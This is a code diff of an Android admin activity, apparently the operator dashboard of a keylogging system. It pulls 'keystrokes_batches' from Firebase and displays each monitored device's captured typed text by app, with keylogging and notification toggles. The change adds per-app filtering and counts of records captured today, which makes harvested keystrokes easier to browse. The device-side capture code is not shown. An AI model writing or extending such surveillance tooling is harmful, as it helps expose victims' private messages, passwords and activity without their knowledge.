@@ -48,16 +48,41 @@ class AdminMainActivity : AppCompatActivity() {
         val name: String,
         var keylogging: Boolean = true,
         var notifications: Boolean = true,
-        var logFeed: String = "Waiting for telemetry...",
+        var selectedAppFilter: String? = null,
         var lastSeenTimestamp: Long = 0L,
-        val appsTodayMap: MutableMap<String, Int> = mutableMapOf()
-    )
+        val rawEntries: MutableList<Triple<Long, String, String>> = mutableListOf()
+    ) {
+        val logFeed: String
+            get() {
+                val filtered = if (selectedAppFilter != null) {
+                    rawEntries.filter { it.second == selectedAppFilter }
+                } else {
+                    rawEntries
+                }
+                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
+                val sb = StringBuilder()
+                for (item in filtered) {
+                    val timeStr = timeFormat.format(Date(item.first))
+                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
+                }
+                return if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded for ${selectedAppFilter ?: "device"}."
+            }
 
-    data class LogEntry(
-        val timestamp: Long,
-        val appName: String,
-        val text: String
-    )
+        val appsTodayMap: Map<String, Int>
+            get() {
+                val map = mutableMapOf<String, Int>()
+                val calendar = Calendar.getInstance()
+                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
+                val todayYear = calendar.get(Calendar.YEAR)
+                for (entry in rawEntries) {
+                    calendar.timeInMillis = entry.first
+                    if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
+                        map[entry.second] = (map[entry.second] ?: 0) + 1
+                    }
+                }
+                return map
+            }
+    }
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -140,7 +165,7 @@ class AdminMainActivity : AppCompatActivity() {
         devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
         devicesListener = object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
-                val allEntries = mutableListOf<LogEntry>()
+                var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
                 var maxLastSeen = 0L
 
@@ -165,7 +190,7 @@ class AdminMainActivity : AppCompatActivity() {
 
                             val timestampMillis = parseTimestamp(entry.child("timestamp").value)
                             if (timestampMillis != null && text.isNotBlank() && text != "null") {
-                                allEntries.add(LogEntry(timestampMillis, prettyApp, text))
+                                totalEntriesCount++
                                 if (timestampMillis > maxLastSeen) {
                                     maxLastSeen = timestampMillis
                                 }
@@ -175,8 +200,8 @@ class AdminMainActivity : AppCompatActivity() {
                 }
 
                 txtConnectedDevices.text = masterDeviceList.size.toString()
-                txtActivityEvents.text = allEntries.size.toString()
-                txtAppsToday.text = masterDeviceList.size.toString() // Total Nodes
+                txtActivityEvents.text = totalEntriesCount.toString()
+                txtAppsToday.text = masterDeviceList.size.toString()
 
                 val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
                 if (isOnline) {
@@ -268,12 +293,6 @@ class AdminMainActivity : AppCompatActivity() {
         logRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 val entries = mutableListOf<Triple<Long, String, String>>()
-                val deviceAppsToday = mutableMapOf<String, Int>()
-                val timeFormat = SimpleDateFormat("HH:mm:ss", Locale.getDefault())
-
-                val calendar = Calendar.getInstance()
-                val todayDayOfYear = calendar.get(Calendar.DAY_OF_YEAR)
-                val todayYear = calendar.get(Calendar.YEAR)
 
                 for (appChild in snapshot.children) {
                     val rawApp = appChild.key ?: continue
@@ -288,30 +307,18 @@ class AdminMainActivity : AppCompatActivity() {
 
                         if (text.isNotBlank() && text != "null") {
                             entries.add(Triple(timestampMillis, prettyApp, text))
-
-                            calendar.timeInMillis = timestampMillis
-                            if (calendar.get(Calendar.DAY_OF_YEAR) == todayDayOfYear && calendar.get(Calendar.YEAR) == todayYear) {
-                                deviceAppsToday[prettyApp] = (deviceAppsToday[prettyApp] ?: 0) + 1
-                            }
                         }
                     }
                 }
 
-                // Sort newest on top and optimize for large data handling by capping to 200 entries
+                // Sort newest on top
                 entries.sortByDescending { it.first }
                 val limitedEntries = entries.take(200)
 
-                val sb = StringBuilder()
-                for (item in limitedEntries) {
-                    val timeStr = timeFormat.format(Date(item.first))
-                    sb.append("[$timeStr] ${item.second}: ${item.third}\n")
-                }
-
                 val index = masterDeviceList.indexOfFirst { it.name == deviceName }
                 if (index != -1) {
-                    masterDeviceList[index].logFeed = if (sb.isNotEmpty()) sb.toString() else "No telemetry recorded yet."
-                    masterDeviceList[index].appsTodayMap.clear()
-                    masterDeviceList[index].appsTodayMap.putAll(deviceAppsToday)
+                    masterDeviceList[index].rawEntries.clear()
+                    masterDeviceList[index].rawEntries.addAll(limitedEntries)
                     adapter.notifyItemChanged(index)
                 }
             }
@@ -334,6 +341,9 @@ class AdminMainActivity : AppCompatActivity() {
             val txtLog: TextView = view.findViewById<TextView>(R.id.txtDeviceLogConsole)
             val scrollView: View = view.findViewById<View>(R.id.logScrollView)
             val containerDeviceAppsToday: LinearLayout = view.findViewById<LinearLayout>(R.id.containerDeviceAppsToday)
+            val layoutFilterHeader: View = view.findViewById<View>(R.id.layoutFilterHeader)
+            val txtActiveFilter: TextView = view.findViewById<TextView>(R.id.txtActiveFilter)
+            val btnBackToAll: Button = view.findViewById<Button>(R.id.btnBackToAll)
         }
 
         override fun onCreateViewHolder(parent: ViewGroup, viewType: Int): ViewHolder {
@@ -362,8 +372,23 @@ class AdminMainActivity : AppCompatActivity() {
                 holder.btnNotif.setBackgroundResource(R.drawable.btn_red_rounded)
             }
 
-            // Populate per-device Apps Recorded Today tile
-            populateDeviceAppsToday(holder.containerDeviceAppsToday, device.appsTodayMap)
+            // Filter Header & Back to All button state
+            if (device.selectedAppFilter != null) {
+                holder.layoutFilterHeader.visibility = View.VISIBLE
+                holder.txtActiveFilter.text = "Filtering: ${device.selectedAppFilter}"
+                holder.btnBackToAll.setOnClickListener {
+                    device.selectedAppFilter = null
+                    notifyItemChanged(position)
+                }
+            } else {
+                holder.layoutFilterHeader.visibility = View.GONE
+            }
+
+            // Populate per-device Apps Recorded Today with click filtering
+            populateDeviceAppsToday(holder.containerDeviceAppsToday, device.appsTodayMap) { appName ->
+                device.selectedAppFilter = appName
+                notifyItemChanged(position)
+            }
 
             holder.scrollView.setOnTouchListener { v, event ->
                 when (event.action) {
@@ -387,7 +412,7 @@ class AdminMainActivity : AppCompatActivity() {
             }
         }
 
-        private fun populateDeviceAppsToday(container: LinearLayout, appsMap: Map<String, Int>) {
+        private fun populateDeviceAppsToday(container: LinearLayout, appsMap: Map<String, Int>, onAppClick: (String) -> Unit) {
             val context = container.context
             container.removeAllViews()
             val sortedApps = appsMap.entries.sortedByDescending { it.value }
@@ -407,7 +432,13 @@ class AdminMainActivity : AppCompatActivity() {
             for ((appName, count) in sortedApps) {
                 val rowLayout = LinearLayout(context).apply {
                     orientation = LinearLayout.VERTICAL
-                    setPadding(0, 4, 0, 4)
+                    setPadding(0, 6, 0, 6)
+                    isClickable = true
+                    isFocusable = true
+                    setBackgroundColor(Color.parseColor("#161B22"))
+                    setOnClickListener {
+                        onAppClick(appName)
+                    }
                 }
 
                 val headerRow = LinearLayout(context).apply {
@@ -415,17 +446,17 @@ class AdminMainActivity : AppCompatActivity() {
                 }
 
                 val nameTv = TextView(context).apply {
-                    text = appName
+                    text = "👉 $appName (Tap to filter)"
                     setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 11f)
                     setTypeface(null, android.graphics.Typeface.BOLD)
-                    setTextColor(Color.parseColor("#F1F5F9"))
+                    setTextColor(Color.parseColor("#38BDF8"))
                     layoutParams = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f)
                 }
 
                 val countTv = TextView(context).apply {
                     text = "$count records"
                     setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 10f)
-                    setTextColor(Color.parseColor("#38BDF8"))
+                    setTextColor(Color.parseColor("#94A3B8"))
                     typeface = android.graphics.Typeface.MONOSPACE
                 }
 
